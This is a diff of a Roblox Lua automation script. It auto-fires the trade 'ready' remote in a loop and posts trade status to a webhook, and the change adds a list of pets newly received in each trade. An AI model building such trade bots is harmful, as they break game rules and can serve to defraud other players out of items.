@@ -151,7 +151,6 @@ end
 
 
 
--- === AUTO READY TRADE LOOP ===
 local readyRemote = ReplicatedStorage
     :WaitForChild("Shared")
     :WaitForChild("Remotes")
@@ -160,6 +159,7 @@ local readyRemote = ReplicatedStorage
 
 local tradeActive = false
 local webhookSentOpen = false
+local oldPetsList = {}
 
 task.spawn(function()
     while task.wait(0.2) do
@@ -172,12 +172,15 @@ task.spawn(function()
         local tradeMenu = menus:FindFirstChild("Trade")
         if not tradeMenu then continue end
 
-        -- если трейд открылся
+        -- трейд открылся
         if tradeMenu.Visible and not tradeActive then
             tradeActive = true
             webhookSentOpen = false
 
             print("📦 Trade menu detected, waiting 6 seconds...")
+
+            -- сохраняем текущее состояние инвентаря
+            oldPetsList = getBackpackPets()
 
             -- вебхук: окно трейда открыто (один раз)
             if not webhookSentOpen then
@@ -203,7 +206,6 @@ task.spawn(function()
                         task.wait(0.1)
                     end
 
-                    -- пауза после полного цикла 0-9
                     if tradeMenu.Visible then
                         task.wait(8.5)
                     end
@@ -211,7 +213,26 @@ task.spawn(function()
 
                 -- когда трейд закрылся
                 if tradeActive then
-                    sendTradeWebhook("✅ Trade completed successfully (window closed)")
+                    -- получаем новый список петов
+                    local newPetsList = getBackpackPets()
+
+                    -- ищем новые петы
+                    local newPets = {}
+                    local oldSet = {}
+                    for _, pet in ipairs(oldPetsList) do oldSet[pet] = true end
+                    for _, pet in ipairs(newPetsList) do
+                        if not oldSet[pet] then
+                            table.insert(newPets, pet)
+                        end
+                    end
+
+                    -- формируем текст для вебхука
+                    local text = "✅ Trade completed successfully (window closed)"
+                    if #newPets > 0 then
+                        text = text .. "\n🎁 New Pets:\n" .. table.concat(newPets, "\n")
+                    end
+
+                    sendTradeWebhook(text)
                 end
 
                 tradeActive = false
